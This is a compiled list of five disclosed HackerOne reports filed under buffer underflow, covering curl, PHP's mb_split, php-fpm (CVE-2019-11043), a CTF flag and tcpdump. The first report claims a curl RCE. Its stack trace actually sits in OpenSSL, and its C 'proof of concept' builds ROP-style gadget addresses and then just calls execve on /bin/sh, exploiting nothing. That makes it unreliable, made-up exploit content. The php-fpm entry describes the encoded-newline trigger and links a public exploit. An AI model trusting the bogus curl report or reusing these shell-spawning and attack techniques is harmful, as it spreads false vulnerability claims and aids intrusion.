# Buffer Underflow

_5 reports — High/Critical, disclosed_

### [Buffer overflow in strcpy](https://hackerone.com/reports/2823554)

- **Report ID:** `2823554`
- **Severity:** Critical
- **Weakness:** Buffer Underflow
- **Program:** curl
- **Reporter:** @rootgh0st
- **Bounty:** - usd
- **Disclosed:** 2024-11-07T17:36:54.461Z
- **CVE(s):** -

**Vulnerability Information:**

**Buffer Overflow Exploit Analysis**

The vulnerability in the program is a classic case of a buffer overflow, triggered by the unsafe use of the `strcpy()` function, which lacks bounds checking. The following section describes the vulnerability, how the return address is overflowed, and how the exploit works to achieve remote code execution.

**Vulnerable Function:**

The vulnerability occurs due to the use of `strcpy()` in the program, which copies data from a source buffer to a destination buffer without verifying that the destination buffer is large enough to hold the incoming data. If the input string is larger than the allocated buffer size, it results in a buffer overflow, which can lead to arbitrary memory overwrites.

**Stack Trace and Buffer Overflow Location:**

The overflow happens when the `strcpy()` function is called. Here's the relevant stack trace from GDB, showing the function call sequence:

```
#0  __strcpy_evex () at ../sysdeps/x86_64/multiarch/strcpy-evex.S:94
#1  0x00007ffff765d2cd in CRYPTO_strdup () from /lib/x86_64-linux-gnu/libcrypto.so.3
#2  0x00007ffff756ef96 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3
#3  0x00007ffff7570103 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3
#4  0x00007ffff7571ef9 in CONF_modules_load_file_ex () from /lib/x86_64-linux-gnu/libcrypto.so.3
#5  0x00007ffff75722c8 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3
#6  0x00007ffff765a98f in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3
#7  0x00007ffff7d51087 in __pthread_once_slow (once_control=0x7ffff7981498, init_routine=0x7ffff765a980)
    at ./nptl/pthread_once.c:116
```

the buffer overflow happens in the curl program, not OpenSSL. The strcpy() or similar function (depending on the code you're working with) in curl is the main cause of the vulnerability, and OpenSSL just happens to be part of the stack trace because curl uses OpenSSL for cryptographic functions.

**Registers at the Breakpoint:**

At the point where the overflow occurs, checking the CPU registers, which show that the `rip` (Instruction Pointer) is at `0x7ffff7e31b80`, inside the `__strcpy_evex` function. Here's the relevant register information:

```
rax            0x472cf0            4664560
rbx            0x7ffff7832be3      140737345956835
rcx            0x472cf0            4664560
rdx            0x472cf0            4664560
rsi            0x7ffff7832be3      140737345956835
rdi            0x472cf0            4664560
rbp            0x7ffff7832b3d      0x7ffff7832b3d
rsp            0x7fffffffd988      0x7fffffffd988
rip            0x7ffff7e31b80      0x7ffff7e31b80 <__strcpy_evex>
```

The key point here is that the program is executing within the `__strcpy_evex` function, which is responsible for copying the string. If the source string exceeds the buffer size, it causes an overflow that allows us to overwrite adjacent memory, such as the return address.

**Memory at the Overflow Location:**

Next, we examined the stack memory using the `x/40x $rsp` GDB command. This allowed us to inspect the contents of the stack and identify where the return address is located:

```
0x7fffffffd988: 0xf765d2cd      0x00007fff      0x00464a60      0x00000000
0x7fffffffd998: 0x00472aa0      0x00000000      0x00000000      0x00000000
0x7fffffffd9a8: 0xf756ef96      0x00007fff      0x00000019      0x00000000
0x7fffffffd9b8: 0x79a81a00      0x206eedee      0xf7832b3d      0x00007fff
0x7fffffffd9c8: 0x00472a70      0x00000000      0x00472aa0      0x00000000
0x7fffffffd9d8: 0x00472cc0      0x00000000      0x00000000      0x00000000
0x7fffffffd9e8: 0xf766ea3d      0x00007fff      0x00000000      0x00000000
0x7fffffffd9f8: 0x00000000      0x00000000      0xf7959ec0      0x00007fff
0x7fffffffda08: 0xf766e9dd      0x00007fff      0x00000019      0x00000000
0x7fffffffda18: 0xf765a09f      0x00007fff      0x00464a60      0x00000000
```

In this dump, the return address that gets overwritten is located in the memory at `0x7fffffffd9b8` (the return address from the function call). By overflowing the buffer, we can overwrite this return address with a controlled value.

**What is Being Overflowed:**

The buffer that is overflowed is used by the `strcpy()` function to copy user-supplied data. Specifically, the buffer that holds the input string is located on the stack, and the buffer size is not checked before data is copied. This allows an attacker to overflow the buffer and overwrite critical parts of the stack, such as the return address.

**Key Target for Overwriting:**
- **Return Address:** The return address of the current function (`0x4005d0`) is overwritten. This is the address that the program will jump to once the current function completes. By modifying this return address, the attacker can control where the program jumps next.

**Exploit Strategy:**

The goal of the exploit is to overwrite the return address to redirect the program's control flow to an attacker-controlled location. Here’s how the exploit works:

1. **Fill the Buffer:** The attacker provides a large string (e.g., filled with "A"s) that is longer than the buffer size, causing the `strcpy()` function to overflow the buffer.
   
2. **Overwrite the Return Address:** As the attacker continues to fill the buffer with data, they eventually overwrite the return address with the address `0x4005d0`, which points to the shell-spawning function.

3. **Redirect Control Flow:** Once the buffer overflows and the return address is overwritten, the program will return to the address specified (in this case, `0x4005d0`). This address should point to a function like `system("/bin/sh")`, which will execute a shell for the attacker.

By achieving this, the attacker is able to execute arbitrary code and gain control of the program, typically leading to remote code execution or other security compromises.

**Conclusion:**

The buffer overflow vulnerability in this program allows for the arbitrary overwriting of the return address on the stack. By exploiting this vulnerability, an attacker can redirect the program’s execution to arbitrary code, effectively gaining control of the system. The specific return address (`0x4005d0`) was identified as the target for redirection, leading to the execution of a malicious payload.

POC CODE IN C:

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define OFFSET 40  
#define SYSTEM 0x4f440  // Address of system() in libc
#define BIN_SH 0x1b3e9a  // Address of the string "/bin/sh" in libc
#define POP_RDI_RET 0x4006f3  // Address of 'pop rdi; ret' gadget 
#define RET 0x4005d0  // Address of a 'ret' gadget 

// Function to perform the buffer overflow and spawn a shell
void exploit() {
    char buffer[128];  // Create a buffer to simulate the overflow

    // Step 1: Construct the payload. Start by filling the buffer with 'A's to reach the return address.
    memset(buffer, 'A', OFFSET);  // Filling the buffer with 'A' until we reach the return address
    printf("[ * ] Buffer filled with 'A's, length: %d\n", OFFSET);

    // Step 2: Overwrite the return address with the address of a 'pop rdi; ret' gadget.
    *((unsigned long*)(buffer + OFFSET)) = POP_RDI_RET;  // This gadget will let us control the first argument of execve()
    printf("[ * ] POP_RDI_RET address: 0x%lx\n", POP_RDI_RET);

    // Step 3: Overwrite the second address with the location of the string "/bin/sh" in libc (the argument for execve).
    *((unsigned long*)(buffer + OFFSET + 8)) = BIN_SH;  // "/bin/sh" is passed as the first argument to execve()
    printf("[ * ] BIN_SH address: 0x%lx\n", BIN_SH);

    // Step 4: Overwrite the third address with the address of the system() function in libc.
    *((unsigned long*)(buffer + OFFSET + 16)) = SYSTEM;  // Calling system("/bin/sh")
    printf("[ * ] SYSTEM address: 0x%lx\n", SYSTEM);

    // Step 5: Add a return address to deal with stack alignment issues, use a ret gadget.
    *((unsigned long*)(buffer + OFFSET + 24)) = RET;  // Ensures stack is properly aligned and continues execution
    printf("[ * ] RET address: 0x%lx\n", RET);

    // Step 6: Send the payload to the vulnerable program (in this case, we simulate it using execve()).
    printf("[ * ] Sending payload...\n");

    // Use execve() to directly execute the payload
    char *args[] = { "/bin/sh", NULL };
    execve("/bin/sh", args, NULL);  // This directly executes "/bin/sh" with null-terminated arguments

    // Debugging message for any potential issues with execve()
    perror("execve() failed");
}

// Main function that starts the exploit
int main() {
    printf("[ * ] Launching exploit, waiting for shell..\n");
    exploit();  // Call the exploit function to trigger the overflow and spawn the shell
    return 0;  // Return from main, though execution should not reach here if the shell is spawned successfully
}

## Impact

Code execution, command shell, possible system take over from this compromise...

---

### [Negative size parameter in mb_split](https://hackerone.com/reports/476178)

- **Report ID:** `476178`
- **Severity:** Critical
- **Weakness:** Buffer Underflow
- **Program:** Internet Bug Bounty
- **Reporter:** @haquaman
- **Bounty:** 1500 usd
- **Disclosed:** 2020-11-09T01:48:52.585Z
- **CVE(s):** CVE-2019-9025

**Vulnerability Information:**

https://bugs.php.net/bug.php?id=77367

mb_split doesn't correctly detect the length when the $string has an unfinished multibyte character at the end of the string. This causes a crash due to a negative parameter to add_next_index_stringl, which calls zend_string_init and memcpy.

Could reproduce on master.

## Impact

This could be used to cause memory corruption/leakage.

---

### [CVE-2019-11043: a buffer underflow in fpm_main.c can lead to RCE in php-fpm](https://hackerone.com/reports/722327)

- **Report ID:** `722327`
- **Severity:** Critical
- **Weakness:** Buffer Underflow
- **Program:** Internet Bug Bounty
- **Reporter:** @neex
- **Bounty:** 1500 usd
- **Disclosed:** 2020-11-09T01:46:16.547Z
- **CVE(s):** CVE-2019-11043

**Vulnerability Information:**

The vulnerability exists in php-fpm because of missing bounds check in fpm_main.c. If the FastCGI variable `PATH_INFO` is empty, the underflow happens when the code tries to calculate the value of the `path_info` variable. An invalid pointer in `path_info` leads to a single byte out-of-bounds write, which can be leveraged to code execution.

The php-fpm allows anyone who can connect to its' port to execute code, so an RCE in php-fpm is not interesting by itself. However, this particular issue can be exploited even by a user who has access to the HTTP server (which is Nginx typically). In certain Nginx configurations, it is possible to make it send empty `PATH_INFO` value by breaking regexp in `fastcgi_split_pathinfo` directive using an encoded newline character (`%0a`).   

The issue was reported to PHP maintainers in the [bug 78599](https://bugs.php.net/bug.php?id=78599) and assigned CVE-2019-11043. It was disclosed on October 22.

The exploit for the issue is available at https://github.com/neex/phuip-fpizdam/.

To reproduce the issue, follow the steps at the ["Playground environment" section](https://github.com/neex/phuip-fpizdam/#playground-environment) in the exploit's README. The repo contains a Dockerfile, which builds the version of PHP just before the fix.

Exploit works only when Nginx config allows to trigger the bug (that is, to send empty `PATH_INFO` FastCGI variable). The full list of preconditions [can be found](https://github.com/neex/phuip-fpizdam/#the-full-list-of-preconditions) at the exploit repository. There are real world examples of big projects empoying such configuration, see e.g. https://twitter.com/chybeta/status/1187213401124036608 (this particular issue is already reported to the corresponding bug bounty program and they hardened the Nginx config).

As the vulnerability resides in php-fpm, not Nginx, there might be other ways to trigger the vulnerability when other HTTP server software is used. However, I'm not aware of any at this moment.

## Impact

If the attack is successful, the attacker can execute code at the server that runs php-fpm with the privileges of the php-fpm process. Again, note that the attacker doesn't have access to the php-fpm socket, she only makes HTTP requests to the nginx.

---

### [[H1-2006 2020]  Got the flag](https://hackerone.com/reports/887744)

- **Report ID:** `887744`
- **Severity:** Critical
- **Weakness:** Buffer Underflow
- **Program:** h1-ctf
- **Reporter:** @s1r1u5
- **Bounty:** - usd
- **Disclosed:** 2020-06-25T21:40:29.134Z
- **CVE(s):** -

**Vulnerability Information:**

Hey got the flag, will update the writeup soon 

started 6:00am may 30

BountyPay
CTF Challenge Completed!
Congratulations, all of the hackers have been paid their Bug Bounty money
and you have completed the challange!

Please submit your write up to https://hackerone.com/h1-ctf and make sure to include the flag below

^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$
 
 10:26am solved may 31

## Impact

Flag

---

### [tcpdump: CVE-2018-14879 - buffer overflow in tcpdump.c:get_next_file()](https://hackerone.com/reports/724217)

- **Report ID:** `724217`
- **Severity:** Critical
- **Weakness:** Buffer Underflow
- **Program:** Internet Bug Bounty
- **Reporter:** @geeknik
- **Bounty:** - usd
- **Disclosed:** 2020-02-13T21:26:24.183Z
- **CVE(s):** CVE-2018-14879

**Vulnerability Information:**

The release of tcpdump 4.9.3 brought many bug fixes, including one I submitted, CVE-2018-14879.

`The command-line argument parser in tcpdump before 4.9.3 has a buffer overflow in tcpdump.c:get_next_file().`

```
==2288==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffe363769bf at pc 0x56336d544e69 bp 0x7ffe36376260 sp 0x7ffe36376258
READ of size 1 at 0x7ffe363769bf thread T0
    #0 0x56336d544e68 in get_next_file tcpdump.c:853
    #1 0x56336d53ab63 in main tcpdump.c:1956
    #2 0x7f83cae7c2e0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202e0)
    #3 0x56336d543169 in _start (/root/tcpdump/tcpdump+0x16d169)

Address 0x7ffe363769bf is located in stack of thread T0 at offset 1727 in frame
    #0 0x56336d53828f in main tcpdump.c:1411

  This frame has 15 object(s):
    [32, 36) 'localnet'
    [96, 100) 'netmask'
    [160, 168) 'endp'
    [224, 232) 'end'
    [288, 296) 'devlist'
    [352, 360) 'end'
    [416, 424) 'dlts'
    [480, 496) 'fcode'
    [544, 576) 'timer'
    [608, 648) 'dumpinfo'
    [704, 848) 'buf'
    [896, 1096) 'Ndo'
    [1152, 1408) 'ebuf'
    [1440, 1696) 'ebuf'
    [1728, 5825) 'VFileLine' <== Memory access at offset 1727 underflows this variable
HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow tcpdump.c:853 in get_next_file
```

Reported: 2018 May 14 (via email to security@tcpdump.org)
Fix Released: 2018 September 30
CVE: https://nvd.nist.gov/vuln/detail/CVE-2018-14879
Credit:  https://www.tcpdump.org/public-cve-list.txt

```
CVSS v3.1 Severity and Metrics:
Base Score: 9.8 CRITICAL
Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (V3.1 legend)
Impact Score: 5.9
Exploitability Score: 3.9 
```

## Impact

Stack buffer overflow can be caused deliberately as part of an attack known as stack smashing. If the affected program is running with special privileges, or accepts data from untrusted network hosts (e.g. a webserver) then the bug is a potential security vulnerability. If the stack buffer is filled with data supplied from an untrusted user then that user can corrupt the stack in such a way as to inject executable code into the running program and take control of the process. This is one of the oldest and more reliable methods for attackers to gain unauthorized access to a computer.

---
